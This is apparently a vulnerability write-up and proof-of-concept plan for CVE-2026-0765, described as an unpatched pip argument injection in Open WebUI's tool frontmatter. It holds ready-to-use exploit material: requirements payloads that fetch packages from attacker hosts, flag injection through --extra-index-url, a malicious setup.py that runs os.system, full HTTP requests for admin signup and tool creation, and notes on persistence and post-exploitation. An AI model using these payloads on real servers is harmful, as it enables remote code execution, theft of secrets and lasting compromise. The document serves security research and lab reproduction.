# Vulnerability Analysis: CVE-2026-0765

## Executive Summary

CVE-2026-0765 is an OS Command Injection (CWE-78) vulnerability in Open WebUI's `install_frontmatter_requirements()` function. An authenticated user with tool creation permissions can inject arbitrary arguments into a `pip install` subprocess call via crafted frontmatter in tool/function content. By specifying a malicious package URL (e.g., `git+https://...` pointing to a repository with a weaponized `setup.py`), the attacker achieves Remote Code Execution (RCE) on the server with the privileges of the Open WebUI process.

**This vulnerability is UNFIXED (0-day).** The vendor has not patched as of v0.8.5 (latest release). In v0.8.5, a feature flag `ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS` was added (defaults to `True`), which can optionally disable the feature entirely but does NOT add any input validation — it is a mitigation toggle, not a fix.

---

## Root Cause

**Missing input validation/sanitization of user-controlled package specifiers passed to `pip install`.**

The function `install_frontmatter_requirements()` in `backend/open_webui/utils/plugin.py` (lines 267-280 at v0.6.32) splits a user-supplied `requirements` string by comma and passes each element directly as arguments to `subprocess.check_call([sys.executable, "-m", "pip", "install"] + ... + req_list + ...)`.

While the subprocess call uses list form (preventing shell metacharacter injection), **pip itself is the command interpreter** — it processes URLs, VCS specifiers, and flags within the arguments. This means an attacker can:

1. **Supply a malicious package URL**: `git+https://attacker.com/evil-repo.git#egg=pkg` — pip clones the repo and executes `setup.py` with arbitrary Python code
2. **Supply a direct download URL**: `https://attacker.com/evil-1.0.tar.gz` — pip downloads the sdist and executes `setup.py`
3. **Inject pip flags via comma separation**: Requirements are split by comma, so `--extra-index-url, https://attacker.com/simple/, evil-pkg` produces three separate arguments: `--extra-index-url`, `https://attacker.com/simple/`, `evil-pkg` — redirecting pip to a malicious package index
4. **Specify typosquatted/malicious PyPI package names**: No allowlist restricts which packages can be installed

The root cause is that `requirements` is treated as a trusted package list, but it originates from user-controlled HTTP request body content (the `content` field of tool/function creation requests). There is zero validation between user input and subprocess execution.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable Function

**File**: `backend/open_webui/utils/plugin.py`  
**Function**: `install_frontmatter_requirements()` — Lines 267-280 (v0.6.32)

```python
def install_frontmatter_requirements(requirements: str):
    if requirements:
        try:
            req_list = [req.strip() for req in requirements.split(",")]
            log.info(f"Installing requirements: {' '.join(req_list)}")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install"]
                + PIP_OPTIONS          # from env var PIP_OPTIONS, default empty list
                + req_list             # *** ATTACKER-CONTROLLED ***
                + PIP_PACKAGE_INDEX_OPTIONS  # from env var PIP_PACKAGE_INDEX_OPTIONS, default empty list
            )
        except Exception as e:
            log.error(f"Error installing packages: {' '.join(req_list)}")
            raise e
    else:
        log.info("No requirements found in frontmatter.")
```

### Caller Functions (Entry Points into Vulnerable Code)

1. **`load_tool_module_by_id()`** — `plugin.py` line 85
   - Called when `content` parameter is provided (tool creation/update from API)
   - Extracts frontmatter from `content`, calls `install_frontmatter_requirements(frontmatter.get("requirements", ""))`

2. **`load_function_module_by_id()`** — `plugin.py` line 129
   - Same pattern as above, for function creation/update

3. **`install_tool_and_function_dependencies()`** — `plugin.py` lines 286-313
   - Called at server startup (`main.py` line 554 inside `lifespan()` context manager)
   - Iterates ALL stored tools and functions, collects requirements, and batch-installs
   - Only processes tools owned by admin users (line 305: `if tool.user and tool.user.role == "admin"`)
   - Processes ALL active functions regardless of owner
   - **Persistence vector**: A previously-stored malicious tool/function re-executes its payload on every server restart

### Frontmatter Extraction

**Function**: `extract_frontmatter()` — `plugin.py` lines 18-51
- Parses triple-quoted docstring at the beginning of content
- Uses regex `r"^\s*([a-z_]+):\s*(.*)\s*$"` (IGNORECASE) to extract key-value pairs
- The `requirements` key value becomes the attack payload
- **No validation** is performed on the extracted values
- The regex accepts any characters after `requirements:` — URLs, flags, special characters all pass through

### API Entry Points

| Endpoint | Router File | Line | Auth Level | Permission Check |
|----------|------------|------|------------|-----------------|
| `POST /api/v1/tools/create` | `routers/tools.py` | 260-318 | Verified user | `workspace.tools` perm OR admin |
| `POST /api/v1/tools/id/{id}/update` | `routers/tools.py` | 348-403 | Verified user | Owner, group write, OR admin |
| `POST /api/v1/functions/create` | `routers/functions.py` | 177-227 | **Admin only** | N/A |
| `POST /api/v1/functions/id/{id}/update` | `routers/functions.py` | 307-341 | **Admin only** | N/A |
| `POST /api/v1/functions/sync` | `routers/functions.py` | 139-169 | **Admin only** | N/A |
| Server startup | `main.py` | 554 | N/A (internal) | Processes stored tools/functions |

---

## Triggering Input

### Minimal Malicious Payload (Direct URL — Simplest)

The attacker sends a tool creation request with `content` containing frontmatter with a malicious `requirements` value pointing to a tar.gz sdist hosted on an attacker-controlled HTTP server:

```python
"""
title: Innocent Tool
requirements: https://ATTACKER_SERVER/evil-1.0.tar.gz
"""

class Tools:
    def example(self):
        pass
```

The `requirements` value `https://ATTACKER_SERVER/evil-1.0.tar.gz` is extracted by `extract_frontmatter()` and passed to `install_frontmatter_requirements()`, which runs:

```
python3 -m pip install https://ATTACKER_SERVER/evil-1.0.tar.gz
```

pip downloads the tar.gz, extracts it, and executes `setup.py` — achieving arbitrary code execution.

### Malicious Package (setup.py)

```python
from setuptools import setup
import os
os.system("id > /tmp/pwned && hostname >> /tmp/pwned")
setup(name="harmless", version="1.0")
```

The sdist archive structure:
```
evil-1.0/
├── setup.py          # Contains malicious code
├── PKG-INFO
└── harmless/
    └── __init__.py   # Empty (package needs at least one module)
```

### Alternative Payloads

1. **Git VCS install** (requires git on target — present in default Docker image):
   ```
   requirements: git+https://attacker.com/malicious-repo.git#egg=pkg
   ```

2. **Pip flag injection via comma separation** (redirects pip to malicious index):
   ```
   requirements: --extra-index-url, https://attacker.com/pypi/simple/, evil-pkg
   ```
   Since requirements are split by comma, each token becomes a separate subprocess argument.

3. **Multiple payloads mixed with legitimate packages**:
   ```
   requirements: requests, https://attacker.com/evil-1.0.tar.gz
   ```

### How the Payload Reaches the Vulnerable Code

```
HTTP Request Body → form_data.content (ToolForm, no validation on content field)
→ tools.py create_new_tools() handler
→ load_tool_module_by_id(tool_id, content=form_data.content)
→ extract_frontmatter(content) → returns {"requirements": "https://ATTACKER/evil.tar.gz", ...}
→ install_frontmatter_requirements("https://ATTACKER/evil.tar.gz")
→ req_list = ["https://ATTACKER/evil.tar.gz"]
→ subprocess.check_call(["python3", "-m", "pip", "install", "https://ATTACKER/evil.tar.gz"])
→ pip downloads evil-1.0.tar.gz, extracts, runs setup.py → RCE
```

---

## Attack Scenario

### Step-by-Step Exploitation (First-User-Admin on Fresh Instance)

**Prerequisites**: A fresh Open WebUI v0.6.32 deployment with default configuration. No prior users.

1. **Attacker prepares malicious Python package**:
   - Creates a `setup.py` with arbitrary Python code (e.g., `os.system("id > /tmp/pwned")`)
   - Packages it as an sdist tar.gz
   - Hosts it on an HTTP server reachable from the Open WebUI container

2. **Attacker signs up as the first user** → automatically becomes admin:
   ```http
   POST /api/v1/auths/signup HTTP/1.1
   Content-Type: application/json

   {"email":"attacker@poc.local","password":"password123","name":"Attacker"}
   ```
   Response includes: `{"token": "<JWT>", "role": "admin", ...}`

3. **Attacker creates a malicious tool** with crafted frontmatter:
   ```http
   POST /api/v1/tools/create HTTP/1.1
   Authorization: Bearer <JWT>
   Content-Type: application/json

   {
     "id": "exploit_tool",
     "name": "Exploit",
     "content": "\"\"\"\ntitle: Exploit\nrequirements: https://ATTACKER_SERVER/evil-1.0.tar.gz\n\"\"\"\n\nclass Tools:\n    def example(self):\n        pass",
     "meta": {"description": ""}
   }
   ```

4. **Server processes the request synchronously**:
   - `create_new_tools()` calls `load_tool_module_by_id("exploit_tool", content=<malicious content>)`
   - `install_frontmatter_requirements("https://ATTACKER_SERVER/evil-1.0.tar.gz")` executes
   - `subprocess.check_call(["python3", "-m", "pip", "install", "https://ATTACKER_SERVER/evil-1.0.tar.gz"])` runs
   - pip downloads, extracts, and executes `setup.py` → **RCE achieved**

5. **Verify RCE**:
   - Check for marker file: `docker exec cve-2026-0765-vulnerable cat /tmp/pwned`
   - Or use network callback/reverse shell for out-of-band verification

6. **Persistence**: The malicious tool is stored in the SQLite database. On every server restart, `install_tool_and_function_dependencies()` re-installs the requirements, re-executing the malicious `setup.py`.

---

## Impact

- **Remote Code Execution (RCE)** on the Open WebUI server
- **Full server compromise** — the default Docker deployment runs as root (UID=0)
- **Data exfiltration** — access to all conversations, API keys (OpenAI, Ollama), model configurations, user credentials
- **Secret key access** — `WEBUI_SECRET_KEY` in environment allows forging JWT tokens for any user
- **Persistent backdoor** — malicious tool stored in DB re-executes requirements on every server restart via `install_tool_and_function_dependencies()` (main.py line 554)
- **Lateral movement** — container typically has network access to Ollama server, databases, and other backend services

**CVSS 3.0: 8.8 (HIGH)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

---

## Authentication Requirements

### Full Auth Flow for PoC

1. **Sign up** (fresh instance — first user becomes admin):
   ```
   POST /api/v1/auths/signup
   Content-Type: application/json
   Body: {"email": "attacker@poc.local", "password": "password123", "name": "Attacker"}
   Response: {"token": "<JWT>", "token_type": "Bearer", "id": "<uuid>", "role": "admin", ...}
   ```

2. **Use token** in subsequent requests:
   - Header: `Authorization: Bearer <JWT>`

### Permission Requirements by Endpoint

| Endpoint | Auth Required | Minimum Role | Additional Permission |
|----------|--------------|-------------|----------------------|
| `POST /api/v1/auths/signup` | **No** | N/A | First user = admin; subsequent = pending |
| `POST /api/v1/tools/create` | Yes | `user` | `workspace.tools` permission OR admin |
| `POST /api/v1/tools/{id}/update` | Yes | `user` | Owner, group write, OR admin |
| `POST /api/v1/functions/create` | Yes | `admin` | Admin-only |
| `POST /api/v1/functions/{id}/update` | Yes | `admin` | Admin-only |

### Default Configuration

- `WEBUI_AUTH=True` — authentication enabled
- `ENABLE_SIGNUP=True` — self-registration enabled (disabled after first user signup on fresh instances, but `True` in the environment by default)
- `DEFAULT_USER_ROLE="pending"` — subsequent users are pending (cannot create tools)
- **First user signup gets `admin` role** — no pre-existing users needed on fresh instances

### PoC Strategy

The PoC targets the **first-user-becomes-admin** scenario on a fresh instance:
1. Start fresh Open WebUI
2. Sign up → automatically become admin (first user gets admin role, line 593 in auths.py: `role = "admin" if not has_users else ...`)
3. Create malicious tool with crafted requirements → triggers pip install → RCE

This requires zero privilege escalation and works on default configuration.

---

## Fix Assessment

**There is NO fix.** This is a 0-day vulnerability disclosed via ZDI-26-031 after the vendor closed the report without providing a patch.

### Current State (v0.6.32 — Tested Version)
- No input validation on requirements field
- No allowlist/denylist for package specifiers
- No sandboxing of pip execution
- `install_frontmatter_requirements()` passes user input directly to pip

### State in v0.8.5 (Latest Release)
- A feature flag `ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS` was added (defaults to `True`)
- An `OFFLINE_MODE` check was added
- **Neither adds any input validation** — when enabled (the default), the vulnerability is identical
- The feature flag is a workaround, not a security fix — it disables the entire feature rather than making it safe

### exec() Code Execution (Separate but Related)

Beyond the pip command injection (CVE-2026-0765), the same code path also contains **direct arbitrary code execution** via `exec()`:

- `plugin.py` line 101: `exec(content, module.__dict__)` in `load_tool_module_by_id()`
- `plugin.py` line 145: `exec(content, module.__dict__)` in `load_function_module_by_id()`

The entire `content` field is executed as Python code. The `exec()` calls happen *after* `install_frontmatter_requirements()` runs. Both are exploitable independently. The `exec()` vector is a more direct RCE path but is arguably "by design" (tools/functions are intended to be executable Python code), while the pip injection via frontmatter requirements is the unintended vulnerability covered by CVE-2026-0765.

**NOTE**: The PoC should target the pip injection vector (CVE-2026-0765), not the `exec()` vector. The pip injection is the specific vulnerability identified in the advisory.

---

## Potential Bypass Vectors

Since there is no fix to bypass, this section addresses potential mitigations and their weaknesses:

- **If a package name allowlist were added**: Could be bypassed via typosquatting, dependency confusion, or using allowed package names with malicious version specifiers
- **If URL validation were added**: Could be bypassed via URL redirects, shortened URLs, or novel VCS specifier formats
- **If pip `--no-deps` were enforced**: Would reduce but not eliminate risk (setup.py still executes for direct URL/VCS installs)
- **If `--no-build-isolation` were used**: Would not prevent setup.py execution
- **The `exec()` code execution is a separate, independent vulnerability** that would remain even if pip injection were fixed

---

## Escalation Path

The vulnerability directly achieves RCE — no escalation chain is needed. The pip `setup.py` execution primitive gives full arbitrary code execution in a single step.

Post-exploitation escalation paths:
1. **Root access** — Default Docker container runs as root (UID=0)
2. **Database access** — SQLite DB at `/app/backend/data/webui.db` contains all user credentials, conversations, API keys
3. **Secret key access** — `WEBUI_SECRET_KEY` in environment allows forging JWT tokens for any user
4. **Persistence** — Malicious tool stored in DB re-executes requirements on every server restart
5. **Network pivot** — Container typically has access to Ollama server and other backend services

---

## Related Attack Surface

### 1. exec() Code Execution (Same File, Same Code Path)
**File**: `backend/open_webui/utils/plugin.py`
- **Line 101**: `exec(content, module.__dict__)` in `load_tool_module_by_id()`
- **Line 145**: `exec(content, module.__dict__)` in `load_function_module_by_id()`
- **Impact**: Direct arbitrary Python code execution, independent of the pip injection vector
- **Same entry points**: Triggered via the same tool/function create/update API endpoints
- **Executes after pip install**: Line 101 runs after line 85 (install_frontmatter_requirements call)

### 2. Server Startup Batch Install (Persistence)
**File**: `backend/open_webui/utils/plugin.py`
- **Function**: `install_tool_and_function_dependencies()` — Lines 286-313
- **Called from**: `main.py` line 554 inside `lifespan()` async context manager
- Iterates ALL admin-owned tools and ALL active functions, collecting requirements
- Calls `install_frontmatter_requirements()` with concatenated requirements string
- **Impact**: Persistent payload — re-executes on every server restart

### 3. load_tool_from_url (Admin-Only, Indirect)
**File**: `backend/open_webui/routers/tools.py` — Lines 197-241
- **Endpoint**: `POST /tools/load/url`
- **Auth**: Admin only (`get_admin_user`)
- Downloads Python code from a URL and returns it as tool content
- Does NOT directly trigger pip install (just returns content for the user to then submit via create/update)
- Not a direct vector but could be used to fetch malicious content

### 4. No Similar Pattern in Other Files
The `subprocess.check_call` with pip is unique to `install_frontmatter_requirements()`. Other subprocess calls in the codebase (in `hatch_build.py` and `contribution_stats.py`) use hardcoded arguments without user input. **No additional subprocess injection patterns found.**

---

## Build System

### Build System Details
| Field | Value |
|---|---|
| **Build System** | Python pip/hatchling (backend), npm (frontend) |
| **Python Version** | 3.11+ |
| **Package Manager** | pip (with optional uv accelerator) |
| **Base Docker Image** | `python:3.11-slim-bookworm` |
| **Frontend** | SvelteKit (Node.js 22) — NOT needed for PoC |
| **Official Docker Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |

### Build Commands (Using Official Docker Image — Recommended)

No build from source is needed. The official Docker image contains the exact vulnerable version:

```bash
docker pull ghcr.io/open-webui/open-webui:v0.6.32
```

### Build Commands (From Source — Backend Only)

```bash
# Install Python dependencies
pip install -r backend/requirements.txt

# Start the application
cd backend
WEBUI_SECRET_KEY="test-secret-key" python -m uvicorn open_webui.main:app --host 0.0.0.0 --port 8080
```

### Dependencies

**System packages** (Debian bookworm):
- `git` — **REQUIRED** for pip VCS installs (git+https:// attack vector)
- `build-essential`, `python3-dev`, `gcc` — for compiling Python packages with C extensions
- `curl`, `jq` — for healthcheck and utilities
- `pandoc` — for document processing
- `netcat-openbsd` — for network utilities

**Python packages**: See `backend/requirements.txt` — key ones:
- `fastapi==0.115.7` — web framework
- `uvicorn[standard]==0.35.0` — ASGI server
- `sqlalchemy==2.0.38` — ORM
- `pydantic==2.11.7` — data validation
- `python-jose==3.4.0` — JWT handling
- `passlib[bcrypt]==1.7.4` + `bcrypt==4.3.0` — password hashing

### Runtime Requirements

- **Port**: 8080 (default)
- **Environment Variables**:
  - `WEBUI_SECRET_KEY` — JWT signing key (required; set to known value for PoC)
  - `USE_SLIM_DOCKER=true` — skip ML model downloads (faster startup, ~2GB saved)
  - `USE_OLLAMA_DOCKER=false` — no Ollama backend needed
  - `WEBUI_AUTH=true` — authentication enabled
  - `ENABLE_SIGNUP=true` — self-registration enabled
- **Database**: SQLite (default) — auto-created at `/app/backend/data/webui.db`
- **No external services required**: No Ollama, no PostgreSQL, no Redis needed for PoC

### Lab Container Details

| Field | Value |
|---|---|
| **Container Name** | `cve-2026-0765-vulnerable` |
| **Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |
| **Host Port** | 8080 |
| **Networks** | `lab-net` (internal) |
| **Running User** | root (UID=0, GID=0) |
| **Python** | 3.11 |
| **pip** | 24.0 |
| **git** | 2.39.5 |
| **Database** | SQLite (auto-created at `/app/backend/data/webui.db`) |
| **Startup Time** | ~25-35 seconds to healthy |
| **Healthcheck** | `curl http://localhost:8080/health` |

### Lab Access

```bash
# Verify health
curl http://localhost:8080/health

# Verify version
curl http://localhost:8080/api/config | jq .version
```

### Docker Compose

```bash
# Start
docker compose up -d

# Stop
docker compose down
```
